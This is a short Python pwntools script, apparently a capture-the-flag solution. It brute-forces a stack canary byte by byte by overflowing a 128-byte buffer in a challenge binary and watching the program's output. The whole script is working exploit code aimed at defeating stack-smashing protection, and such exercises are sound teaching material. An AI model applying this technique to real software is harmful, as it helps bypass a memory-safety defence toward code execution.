from pwn import *
canary = ''
for i in range(1, 5):
  for e in range(256):
    sh = process('/problems/p01-7_2_822d136b9a77ae03dc75b750853c9d67/vuln')
    sh.sendline(str(128+i))
    sh.sendline('a'*128+canary+chr(e))
    output = sh.recvall()
    if "hacker" not in output:
      canary += chr(e)
      break
print "The Canary Is: "+canary